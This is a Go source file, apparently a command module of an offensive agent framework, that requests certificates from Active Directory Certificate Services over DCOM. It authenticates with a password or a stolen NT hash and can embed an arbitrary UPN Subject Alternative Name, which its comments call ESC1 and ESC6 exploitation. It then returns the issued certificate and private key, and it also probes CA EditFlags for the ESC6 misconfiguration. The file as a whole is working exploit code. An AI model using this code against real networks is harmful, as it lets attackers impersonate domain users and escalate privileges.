package commands

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/pem"
	"fmt"
	"net"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/oiweiwei/go-msrpc/midl/uuid"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom"
	csra_client "github.com/oiweiwei/go-msrpc/msrpc/dcom/csra/client"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/csra/icertadmind2/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/iactivation/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/iobjectexporter/v0"
	wcce_client "github.com/oiweiwei/go-msrpc/msrpc/dcom/wcce/client"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/wcce/icertrequestd/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
	sspcred "github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"

	"github.com/oiweiwei/go-msrpc/msrpc/dcom/wcce"

	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/hresult"
	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
)

// adcsRequestArgs extends the base adcs args for the request action
type adcsRequestArgs struct {
	Server   string `json:"server"`
	Username string `json:"username"`
	Password string `json:"password"`
	Hash     string `json:"hash"`
	Domain   string `json:"domain"`
	CAName   string `json:"ca_name"`
	Template string `json:"template"`
	Subject  string `json:"subject"`
	AltName  string `json:"alt_name"`
	Timeout  int    `json:"timeout"`
}

// CR_DISP constants from MS-WCCE
const (
	crDispIssued          = 0x00000003
	crDispUnderSubmission = 0x00000005
	crDispDenied          = 0x00000002
	crDispIssuedOutOfBand = 0x00000006
	crFlagRenewal         = 0x00000004
)

// CR_IN_PKCS10 flag — the request is a PKCS#10 CSR
const crInPKCS10 = 0x00000100

// OID for Subject Alternative Name extension
var oidSubjectAltName = asn1.ObjectIdentifier{2, 5, 29, 17}

// adcsRequest handles the "request" action for the adcs command.
// It generates a PKCS#10 CSR, submits it to a CA via DCOM (ICertRequestD),
// and returns the issued certificate.
func adcsRequest(args adcsRequestArgs) structs.CommandResult {
	if args.CAName == "" {
		return errorResult("Error: ca_name required (e.g., 'CA-NAME' from 'adcs -action cas')")
	}
	if args.Template == "" {
		return errorResult("Error: template required (e.g., 'User', 'Machine', or a vulnerable template name)")
	}
	if args.Username == "" || (args.Password == "" && args.Hash == "") {
		return errorResult("Error: username and password (or hash) required for DCOM authentication")
	}
	if args.Timeout <= 0 {
		args.Timeout = 30
	}

	// Parse domain from username if not specified
	if args.Domain == "" {
		if parts := strings.SplitN(args.Username, `\`, 2); len(parts) == 2 {
			args.Domain = parts[0]
			args.Username = parts[1]
		} else if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
			args.Domain = parts[1]
			args.Username = parts[0]
		}
	}

	// Default subject to current user if not specified
	if args.Subject == "" {
		args.Subject = fmt.Sprintf("CN=%s", args.Username)
	}

	// Generate RSA key pair
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return errorf("Error generating RSA key: %v", err)
	}

	// Build CSR
	csrDER, err := adcsBuildCSR(key, args.Subject, args.AltName)
	if err != nil {
		return errorf("Error building CSR: %v", err)
	}

	// Build NTLM credential
	credUser := args.Username
	if args.Domain != "" {
		credUser = args.Domain + `\` + args.Username
	}

	var cred sspcred.Credential
	if args.Hash != "" {
		hash := args.Hash
		if parts := strings.SplitN(hash, ":", 2); len(parts) == 2 && len(parts[0]) == 32 && len(parts[1]) == 32 {
			hash = parts[1]
		}
		cred = sspcred.NewFromNTHash(credUser, hash)
	} else {
		cred = sspcred.NewFromPassword(credUser, args.Password)
	}

	ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(context.Background()),
		time.Duration(args.Timeout)*time.Second)
	defer cancel()

	// Submit CSR via DCOM — pass credentials as dcerpc options (matching go-msrpc config pattern)
	resp, err := adcsSubmitCSR(ctx, args.Server, args.CAName, args.Template, args.AltName, csrDER, cred)
	if err != nil {
		return errorf("Error submitting certificate request: %v", err)
	}

	// Build output
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("CA: %s | Template: %s\n", args.CAName, args.Template))
	sb.WriteString(fmt.Sprintf("Request ID: %d\n", resp.RequestID))
	sb.WriteString(fmt.Sprintf("Disposition: %s (0x%08x)\n", adcsDispositionString(resp.Disposition), resp.Disposition))

	if resp.DispositionMessage != nil && len(resp.DispositionMessage.Buffer) > 0 {
		msg := adcsDecodeUTF16(resp.DispositionMessage.Buffer)
		if msg != "" {
			sb.WriteString(fmt.Sprintf("Message: %s\n", msg))
		}
	}

	switch resp.Disposition {
	case crDispIssued, crDispIssuedOutOfBand:
		// Certificate was issued
		if resp.EncodedCert != nil && len(resp.EncodedCert.Buffer) > 0 {
			certPEM := pem.EncodeToMemory(&pem.Block{
				Type:  "CERTIFICATE",
				Bytes: resp.EncodedCert.Buffer,
			})
			keyPEM := pem.EncodeToMemory(&pem.Block{
				Type:  "RSA PRIVATE KEY",
				Bytes: x509.MarshalPKCS1PrivateKey(key),
			})

			sb.WriteString("\n--- ISSUED CERTIFICATE ---\n")
			sb.Write(certPEM)
			sb.WriteString("\n--- PRIVATE KEY ---\n")
			sb.Write(keyPEM)

			// Parse cert for summary
			if cert, err := x509.ParseCertificate(resp.EncodedCert.Buffer); err == nil {
				sb.WriteString(fmt.Sprintf("\nSubject: %s\n", cert.Subject))
				sb.WriteString(fmt.Sprintf("Issuer: %s\n", cert.Issuer))
				sb.WriteString(fmt.Sprintf("Serial: %s\n", cert.SerialNumber))
				sb.WriteString(fmt.Sprintf("Valid: %s → %s\n",
					cert.NotBefore.Format("2006-01-02 15:04:05"),
					cert.NotAfter.Format("2006-01-02 15:04:05")))
				if len(cert.DNSNames) > 0 {
					sb.WriteString(fmt.Sprintf("SANs (DNS): %s\n", strings.Join(cert.DNSNames, ", ")))
				}
				if len(cert.EmailAddresses) > 0 {
					sb.WriteString(fmt.Sprintf("SANs (Email): %s\n", strings.Join(cert.EmailAddresses, ", ")))
				}
				for _, ip := range cert.IPAddresses {
					sb.WriteString(fmt.Sprintf("SANs (IP): %s\n", ip))
				}
			}
		}
	case crDispUnderSubmission:
		sb.WriteString("\nCertificate request is PENDING manager approval.\n")
		sb.WriteString(fmt.Sprintf("Use request ID %d to retrieve it later.\n", resp.RequestID))
	default:
		sb.WriteString("\nCertificate request was DENIED or failed.\n")
	}

	status := "success"
	if resp.Disposition != crDispIssued && resp.Disposition != crDispIssuedOutOfBand && resp.Disposition != crDispUnderSubmission {
		status = "error"
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

// adcsBuildCSR creates a PKCS#10 certificate signing request.
func adcsBuildCSR(key *rsa.PrivateKey, subject, altName string) ([]byte, error) {
	subj, err := adcsParseSubject(subject)
	if err != nil {
		return nil, fmt.Errorf("invalid subject: %v", err)
	}

	template := &x509.CertificateRequest{
		Subject:            subj,
		SignatureAlgorithm: x509.SHA256WithRSA,
	}

	// Add Subject Alternative Name if specified (ESC1 exploitation)
	if altName != "" {
		sanExt, err := adcsBuildSANExtension(altName)
		if err != nil {
			return nil, fmt.Errorf("building SAN extension: %v", err)
		}
		template.ExtraExtensions = append(template.ExtraExtensions, sanExt)
	}

	return x509.CreateCertificateRequest(rand.Reader, template, key)
}

// adcsParseSubject parses a subject string like "CN=user,O=org" into pkix.Name.
func adcsParseSubject(s string) (pkix.Name, error) {
	name := pkix.Name{}
	for _, part := range strings.Split(s, ",") {
		part = strings.TrimSpace(part)
		kv := strings.SplitN(part, "=", 2)
		if len(kv) != 2 {
			continue
		}
		key := strings.ToUpper(strings.TrimSpace(kv[0]))
		val := strings.TrimSpace(kv[1])
		switch key {
		case "CN":
			name.CommonName = val
		case "O":
			name.Organization = []string{val}
		case "OU":
			name.OrganizationalUnit = []string{val}
		case "L":
			name.Locality = []string{val}
		case "ST", "S":
			name.Province = []string{val}
		case "C":
			name.Country = []string{val}
		default:
			return name, fmt.Errorf("unknown subject component: %s", key)
		}
	}
	return name, nil
}

// adcsBuildSANExtension builds a Subject Alternative Name extension.
// Supports UPN (user@domain) format for ESC1 exploitation.
func adcsBuildSANExtension(altName string) (pkix.Extension, error) {
	// ASN.1 GeneralName tags
	const (
		tagOtherName = 0 // [0] IMPLICIT OtherName
		tagRFC822    = 1 // [1] IMPLICIT IA5String (email)
		tagDNS       = 2 // [2] IMPLICIT IA5String
	)

	// OID for UPN (User Principal Name): 1.3.6.1.4.1.311.20.2.3
	oidUPN := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 20, 2, 3}

	var rawValues []asn1.RawValue

	// If altName contains @, treat as UPN
	if strings.Contains(altName, "@") {
		// UPN is encoded as OtherName with:
		// SEQUENCE { OID(upn), [0] EXPLICIT UTF8String(value) }
		upnUTF8, err := asn1.Marshal(asn1.RawValue{
			Tag:   asn1.TagUTF8String,
			Class: asn1.ClassUniversal,
			Bytes: []byte(altName),
		})
		if err != nil {
			return pkix.Extension{}, err
		}

		// Wrap in explicit [0] tag
		explicitUPN, err := asn1.Marshal(asn1.RawValue{
			Tag:        0,
			Class:      asn1.ClassContextSpecific,
			IsCompound: true,
			Bytes:      upnUTF8,
		})
		if err != nil {
			return pkix.Extension{}, err
		}

		// Build OtherName SEQUENCE
		oidBytes, err := asn1.Marshal(oidUPN)
		if err != nil {
			return pkix.Extension{}, err
		}

		otherNameContent := append(oidBytes, explicitUPN...)

		rawValues = append(rawValues, asn1.RawValue{
			Tag:        tagOtherName,
			Class:      asn1.ClassContextSpecific,
			IsCompound: true,
			Bytes:      otherNameContent,
		})
	} else {
		// Treat as DNS name
		rawValues = append(rawValues, asn1.RawValue{
			Tag:   tagDNS,
			Class: asn1.ClassContextSpecific,
			Bytes: []byte(altName),
		})
	}

	sanBytes, err := asn1.Marshal(rawValues)
	if err != nil {
		return pkix.Extension{}, err
	}

	return pkix.Extension{
		Id:       oidSubjectAltName,
		Critical: false,
		Value:    sanBytes,
	}, nil
}

// adcsSubmitCSR connects to the CA via DCOM and submits the CSR.
// Credentials are passed via dcerpc.WithCredentials() matching the go-msrpc config pattern
// (csra_enum_certdb.go, wmic_using_client_set.go).
func adcsSubmitCSR(ctx context.Context, server, caName, template, altName string, csrDER []byte, cred sspcred.Credential) (*icertrequestd.RequestResponse, error) {
	credOpt := dcerpc.WithCredentials(cred)

	// Step 1: Connect to EPM well-known endpoint (port 135) on the CA server
	cc, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"))
	if err != nil {
		return nil, fmt.Errorf("dial EPM on %s:135: %v", server, err)
	}
	defer cc.Close(ctx)

	// Step 2: ObjectExporter — ServerAlive2 to get COM version and bindings
	cli, err := iobjectexporter.NewObjectExporterClient(ctx, cc, dcerpc.WithSign(), credOpt)
	if err != nil {
		return nil, fmt.Errorf("object exporter client: %v", err)
	}

	srv, err := cli.ServerAlive2(ctx, &iobjectexporter.ServerAlive2Request{})
	if err != nil {
		return nil, fmt.Errorf("ServerAlive2: %v", err)
	}

	// Step 3: RemoteActivation — activate ICertRequestD via DCOM
	iact, err := iactivation.NewActivationClient(ctx, cc, dcerpc.WithSign(), credOpt)
	if err != nil {
		return nil, fmt.Errorf("activation client: %v", err)
	}

	// ClassID for the certificate request COM class (CertRequestD).
	certServerClassID := dtyp.GUIDFromUUID(uuid.MustParse("d99e6e74-fc88-11d0-b498-00a0c90312f3"))

	act, err := iact.RemoteActivation(ctx, &iactivation.RemoteActivationRequest{
		ORPCThis:                   &dcom.ORPCThis{Version: srv.COMVersion},
		ClassID:                    certServerClassID,
		IIDs:                       []*dcom.IID{icertrequestd.CertRequestDIID},
		RequestedProtocolSequences: []uint16{7, 15}, // ncacn_ip_tcp, ncacn_np
	})
	if err != nil {
		return nil, fmt.Errorf("RemoteActivation: %v", err)
	}
	if act.HResult != 0 {
		return nil, fmt.Errorf("RemoteActivation HRESULT: 0x%08x", uint32(act.HResult))
	}

	// Step 4: Dial the OXID endpoint for the activated object
	conn, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"),
		act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp")...)
	if err != nil {
		return nil, fmt.Errorf("dial OXID endpoint: %v", err)
	}
	defer conn.Close(ctx)

	// Step 5: Create WCCE client — fresh security context, credentials via option
	ctx = gssapi.NewSecurityContext(ctx)
	wcceCli, err := wcce_client.NewClient(ctx, conn, dcerpc.WithSeal(), credOpt)
	if err != nil {
		return nil, fmt.Errorf("WCCE client: %v", err)
	}
	wcceCli = wcceCli.IPID(ctx, act.InterfaceData[0].IPID())

	// Step 6: Build request attributes
	attrs := fmt.Sprintf("CertificateTemplate:%s\n", template)
	if altName != "" {
		// Also set SAN via attributes for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)
		attrs += fmt.Sprintf("SAN:upn=%s\n", altName)
	}

	// Step 7: Submit the certificate request
	resp, err := wcceCli.CertRequestD().Request(ctx, &icertrequestd.RequestRequest{
		This:       &dcom.ORPCThis{Version: srv.COMVersion},
		Flags:      crInPKCS10,
		Authority:  caName,
		Attributes: attrs,
		Request: &wcce.CertTransportBlob{
			Length: uint32(len(csrDER)),
			Buffer: csrDER,
		},
	})
	if err != nil {
		return nil, fmt.Errorf("ICertRequestD::Request: %v", err)
	}

	return resp, nil
}

func adcsDispositionString(d uint32) string {
	switch d {
	case crDispIssued:
		return "ISSUED"
	case crDispUnderSubmission:
		return "PENDING"
	case crDispDenied:
		return "DENIED"
	case crDispIssuedOutOfBand:
		return "ISSUED_OUT_OF_BAND"
	default:
		return "ERROR"
	}
}

// EDITF_ATTRIBUTESUBJECTALTNAME2 — CA policy flag enabling ESC6.
// When set, the CA accepts SANs specified in request attributes, allowing
// any template to be used for impersonation regardless of template config.
const editfAttributeSubjectAltName2 = 0x00040000

// adcsQueryEditFlags connects to a CA via DCOM (ICertAdminD2) and retrieves
// the EditFlags from the policy module configuration. This is used to detect
// ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2).
// Returns the EditFlags value, or an error if the query fails.
func adcsQueryEditFlags(ctx context.Context, server, caName string, cred sspcred.Credential) (uint32, error) {
	credOpt := dcerpc.WithCredentials(cred)

	// Connect to EPM on port 135
	cc, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"))
	if err != nil {
		return 0, fmt.Errorf("dial EPM on %s:135: %v", server, err)
	}
	defer cc.Close(ctx)

	// ObjectExporter — ServerAlive2
	cli, err := iobjectexporter.NewObjectExporterClient(ctx, cc, dcerpc.WithSign(), credOpt)
	if err != nil {
		return 0, fmt.Errorf("object exporter client: %v", err)
	}
	srv, err := cli.ServerAlive2(ctx, &iobjectexporter.ServerAlive2Request{})
	if err != nil {
		return 0, fmt.Errorf("ServerAlive2: %v", err)
	}

	// RemoteActivation — activate CertAdminD class (d99e6e73) with ICertAdminD2 IID
	iact, err := iactivation.NewActivationClient(ctx, cc, dcerpc.WithSign(), credOpt)
	if err != nil {
		return 0, fmt.Errorf("activation client: %v", err)
	}

	certAdminClassID := dtyp.GUIDFromUUID(uuid.MustParse("d99e6e73-fc88-11d0-b498-00a0c90312f3"))
	act, err := iact.RemoteActivation(ctx, &iactivation.RemoteActivationRequest{
		ORPCThis:                   &dcom.ORPCThis{Version: srv.COMVersion},
		ClassID:                    certAdminClassID,
		IIDs:                       []*dcom.IID{icertadmind2.CertAdminD2IID},
		RequestedProtocolSequences: []uint16{7, 15},
	})
	if err != nil {
		return 0, fmt.Errorf("RemoteActivation: %v", err)
	}
	if act.HResult != 0 {
		return 0, fmt.Errorf("RemoteActivation HRESULT: 0x%08x", uint32(act.HResult))
	}

	// Dial OXID endpoint
	conn, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"),
		act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp")...)
	if err != nil {
		return 0, fmt.Errorf("dial OXID endpoint: %v", err)
	}
	defer conn.Close(ctx)

	// Create CSRA client (CertAdminD + CertAdminD2)
	ctx = gssapi.NewSecurityContext(ctx)
	csraCli, err := csra_client.NewClient(ctx, conn, dcerpc.WithSeal(), credOpt)
	if err != nil {
		return 0, fmt.Errorf("CSRA client: %v", err)
	}
	csraCli = csraCli.IPID(ctx, act.InterfaceData[0].IPID())

	// Query EditFlags via GetConfigEntry
	resp, err := csraCli.CertAdminD2().GetConfigEntry(ctx, &icertadmind2.GetConfigEntryRequest{
		This:      &dcom.ORPCThis{Version: srv.COMVersion},
		Authority: caName,
		NodePath:  `PolicyModules\CertificateAuthority_MicrosoftDefault.Policy`,
		Entry:     "EditFlags",
	})
	if err != nil {
		return 0, fmt.Errorf("GetConfigEntry(EditFlags): %v", err)
	}

	// EditFlags is REG_DWORD → VT_I4 → VarUnion.Long
	if resp.Variant != nil && resp.Variant.VarUnion != nil {
		if val := resp.Variant.VarUnion.GetValue(); val != nil {
			switch v := val.(type) {
			case int32:
				return uint32(v), nil
			case uint32:
				return v, nil
			case int64:
				return uint32(v), nil
			}
		}
	}

	return 0, fmt.Errorf("unexpected variant type for EditFlags")
}

// adcsDecodeUTF16 decodes a UTF-16LE byte slice to a Go string.
func adcsDecodeUTF16(b []byte) string {
	if len(b) < 2 {
		return ""
	}
	u16 := make([]uint16, len(b)/2)
	for i := range u16 {
		u16[i] = uint16(b[i*2]) | uint16(b[i*2+1])<<8
	}
	// Remove null terminator
	for len(u16) > 0 && u16[len(u16)-1] == 0 {
		u16 = u16[:len(u16)-1]
	}
	runes := make([]rune, len(u16))
	for i, v := range u16 {
		runes[i] = rune(v)
	}
	return string(runes)
}
